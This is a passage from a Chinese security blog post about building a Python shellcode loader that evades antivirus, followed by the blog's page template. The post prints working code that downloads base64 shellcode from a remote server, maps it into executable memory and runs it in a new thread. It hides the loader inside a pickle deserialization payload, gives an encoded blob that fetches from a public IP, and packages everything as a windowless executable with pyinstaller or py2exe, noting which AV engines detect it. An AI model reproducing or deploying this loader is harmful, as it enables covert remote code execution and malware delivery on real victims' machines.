class="line">shellcode = <span class="string">"""</span></span><br><span class="line"><span class="string">shellcode = urllib.request.urlopen('http://192.168.1.1:8000/test.txt').read()  # 请求pyload（base64格式）</span></span><br><span class="line"><span class="string">shellcode = base64.b64decode(shellcode) # base64解密</span></span><br><span class="line"><span class="string">shellcode =codecs.escape_decode(shellcode)[0] # </span></span><br><span class="line"><span class="string">shellcode = bytearray(shellcode) # 返回新字节数组</span></span><br><span class="line"><span class="string"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span></span><br><span class="line"><span class="string"># 申请内存</span></span><br><span class="line"><span class="string">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"># 放入shellcode</span></span><br><span class="line"><span class="string">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.RtlMoveMemory(</span></span><br><span class="line"><span class="string">    ctypes.c_uint64(ptr), </span></span><br><span class="line"><span class="string">    buf, </span></span><br><span class="line"><span class="string">    ctypes.c_int(len(shellcode))</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string"># 创建一个线程从shellcode防止位置首地址开始执行</span></span><br><span class="line"><span class="string">handle = ctypes.windll.kernel32.CreateThread(</span></span><br><span class="line"><span class="string">    ctypes.c_int(0), </span></span><br><span class="line"><span class="string">    ctypes.c_int(0), </span></span><br><span class="line"><span class="string">    ctypes.c_uint64(ptr), </span></span><br><span class="line"><span class="string">    ctypes.c_int(0), </span></span><br><span class="line"><span class="string">    ctypes.c_int(0), </span></span><br><span class="line"><span class="string">    ctypes.pointer(ctypes.c_int(0))</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string"># 等待上面创建的线程运行完</span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))"""</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span>(<span class="keyword">exec</span>,(shellcode,))</span><br><span class="line"></span><br><span class="line"><span class="comment">#序列化、编码</span></span><br><span class="line">ret = pickle.dumps(A())</span><br><span class="line">ret_base64 = base64.b64encode(ret)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-202012051534357041.png" alt="image-20201205153435704"></p>
+<p>再进行base64解码、反序列化操作，执行脚本，正常上线。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes,urllib.request,codecs,base64,pickle</span><br><span class="line"><span class="comment">#解码、反序列化</span></span><br><span class="line">ret_base64 = <span class="string">b"gASVKwQAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlFgMBAAACnNoZWxsY29kZSA9IHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHA6Ly84MS42OC4yMzUuMjE5OjgwMDAvdGVzdC50eHQnKS5yZWFkKCkKc2hlbGxjb2RlID0gYmFzZTY0LmI2NGRlY29kZShzaGVsbGNvZGUpCnNoZWxsY29kZSA9Y29kZWNzLmVzY2FwZV9kZWNvZGUoc2hlbGxjb2RlKVswXQpzaGVsbGNvZGUgPSBieXRlYXJyYXkoc2hlbGxjb2RlKQojIOiuvue9rlZpcnR1YWxBbGxvY+i/lOWbnuexu+Wei+S4umN0eXBlcy5jX3VpbnQ2NApjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYy5yZXN0eXBlID0gY3R5cGVzLmNfdWludDY0CiMg55Sz6K+35YaF5a2YCnB0ciA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jKGN0eXBlcy5jX2ludCgwKSwgY3R5cGVzLmNfaW50KGxlbihzaGVsbGNvZGUpKSwgY3R5cGVzLmNfaW50KDB4MzAwMCksIGN0eXBlcy5j........"</span> </span><br><span class="line">pickle.loads(base64.b64decode(ret_base64))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205154002722.png" alt="image-20201205154002722"></p>
+<h4 id="生成可执行文件"><a href="#生成可执行文件" class="headerlink" title="生成可执行文件"></a>生成可执行文件</h4><h5 id="pyinstaller"><a href="#pyinstaller" class="headerlink" title="pyinstaller"></a>pyinstaller</h5><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">pyinstaller </span><span class="built_in">--noconsole</span> <span class="built_in">--onefile</span> <span class="string">demo1.</span><span class="string">py </span>-i <span class="string">favicon.</span><span class="string">ico </span>-n <span class="string">demo1 </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">--onefile</span> 打包一个单个文件</span><br><span class="line"><span class="built_in">--noconsole</span> 使用<span class="string">Windows子</span>系统执行.当程序启动的时候不会打开命令行(只对<span class="string">Windows有</span>效)</span><br><span class="line">-i 设置生成执行文件的图标</span><br><span class="line">-n 设置生成执行文件的名字</span><br><span class="line"><span class="comment"># pyinstaller参数可参考：https://pyinstaller.readthedocs.io/en/v3.3.1/usage.html</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205154952238.png" alt="image-20201205154952238"></p>
+<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205154735442.png" alt="image-20201205154735442"></p>
+<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205155120792.png" alt="image-20201205155120792"></p>
+<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201205224811833.png" alt="image-20201205224811833"></p>
+<p>部分AV对<code>Pyinstaller</code>打包的程序检测较为敏感，即使是仅打包<code>print(1)</code>这种代码都有类似的结果</p>
+<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201207153229920.png" alt="image-20201207153229920"></p>
+<h5 id="py2exe"><a href="#py2exe" class="headerlink" title="py2exe"></a>py2exe</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python</span> <span class="selector-tag">setup</span><span class="selector-class">.py</span> <span class="selector-tag">py2exe</span></span><br><span class="line">注: <span class="selector-tag">py2exe</span>为0<span class="selector-class">.10</span><span class="selector-class">.1</span><span class="selector-class">.0</span>版本，亲测<span class="selector-tag">python3</span><span class="selector-class">.6</span><span class="selector-class">.0</span>、<span class="selector-tag">python3</span><span class="selector-class">.7</span><span class="selector-class">.0</span>、<span class="selector-tag">python3</span><span class="selector-class">.7</span><span class="selector-class">.4</span>、<span class="selector-tag">python3</span><span class="selector-class">.7</span><span class="selector-class">.9</span>可生成可执行文件并正常打开,<span class="selector-tag">python3</span><span class="selector-class">.8</span><span class="selector-class">.0</span>、<span class="selector-tag">python3</span><span class="selector-class">.8</span><span class="selector-class">.2</span>、<span class="selector-tag">python3</span><span class="selector-class">.9</span><span class="selector-class">.0</span> 生成执行文件无法正常使用。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># setup.py 用于py2exe打包</span></span><br><span class="line"><span class="keyword">from</span> distutils.core <span class="keyword">import</span> setup</span><br><span class="line"><span class="keyword">import</span> py2exe</span><br><span class="line">setup(</span><br><span class="line">    options=&#123;</span><br><span class="line">        <span class="string">'py2exe'</span>: &#123;</span><br><span class="line">            <span class="string">'optimize'</span>: <span class="number">2</span>, <span class="comment"># 优化级别最高，</span></span><br><span class="line">            <span class="string">'bundle_files'</span>: <span class="number">1</span>, <span class="comment"># 将生成的调用文件打包进exe文件</span></span><br><span class="line">            <span class="string">'compressed'</span>: <span class="number">1</span>, <span class="comment"># 压缩</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    windows=[&#123;<span class="string">"script"</span>: <span class="string">"demo2.py"</span>, <span class="comment">#需要打包的程序的文件路径，windows-&gt;GUI exe的脚本列表,console-&gt; 控制台exe的脚本列表</span></span><br><span class="line">              <span class="string">"icon_resources"</span>: [(<span class="number">1</span>, <span class="string">"favicon.ico"</span>)]&#125;], <span class="comment"># 程序的图标的图片路径</span></span><br><span class="line">    zipfile=<span class="literal">None</span>, <span class="comment"># 不生成library.zip文件，则捆绑在可执行文件中</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201207144921636.png" alt="image-20201207144921636"></p>
+<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201207163850250.png" alt="image-20201207163850250"></p>
+<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201207150048052.png" alt="image-20201207150048052"></p>
+<p><img src="/img/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/image-20201207150125561.png" alt="image-20201207150125561"></p>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.cnblogs.com/Akkuman/p/11851057.html" target="_blank" rel="noopener">https://www.cnblogs.com/Akkuman/p/11851057.html</a></p>
+<p><a href="https://mp.weixin.qq.com/s/sd73eL3-TnMm0zWLCC8cOQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/sd73eL3-TnMm0zWLCC8cOQ</a></p>
+<p><a href="https://docs.python.org/zh-cn/dev/library/pickle.html" target="_blank" rel="noopener">https://docs.python.org/zh-cn/dev/library/pickle.html</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/148696337" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/148696337</a></p>
+
+      
+    </div>
+    
+    
+    
+		<div>
+		  
+			<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-本文结束<i class="fa fa-paw"></i>感谢您的阅读-</div>
+    
+</div>
+		  
+		</div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Python/" rel="tag"><i class="fa fa-tag"></i>Python</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/12/02/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/" rel="next" title="Cobaltstrike Beacon DNS上线">
+                <i class="fa fa-chevron-left"></i> Cobaltstrike Beacon DNS上线
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/12/14/Vue.js/" rel="prev" title="Vue.js 学习笔记">
+                Vue.js 学习笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "1",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      },
+      "slide": {
+        "bdImg": "5",
+        "bdPos": "left",
+        "bdTop": "100"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?'];
+</script>
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/uploads/avatar.jpg"
+                alt="小维同学" />
+            
+              <p class="site-author-name" itemprop="name">小维同学</p>
+              <p class="site-description motion-element" itemprop="description">努力努力再努力</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+		  <!-- 网易音乐播放器 -->
+			<div id="music163player">
+				
+			</div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ximcx.cn/" title="西门吹雪's Blog" target="_blank">西门吹雪's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#原理"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ShellCode"><span class="nav-text">ShellCode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ShellCode加载器"><span class="nav-text">ShellCode加载器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分离"><span class="nav-text">分离</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#编码"><span class="nav-text">编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#下载ShellCode并执行"><span class="nav-text">下载ShellCode并执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反序列化"><span class="nav-text">反序列化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反序列化应用"><span class="nav-text">反序列化应用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#生成可执行文件"><span class="nav-text">生成可执行文件</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#pyinstaller"><span class="nav-text">pyinstaller</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#py2exe"><span class="nav-text">py2exe</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考"><span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">小维同学</span>
+
+  
+</div>
+
+
+
+
+
+
+  <div class="theme-info">❤  <a class="theme-link" target="_blank" href="https://scriptkid-beta.github.io/">LZL</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":-15,"vOffset":-15},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
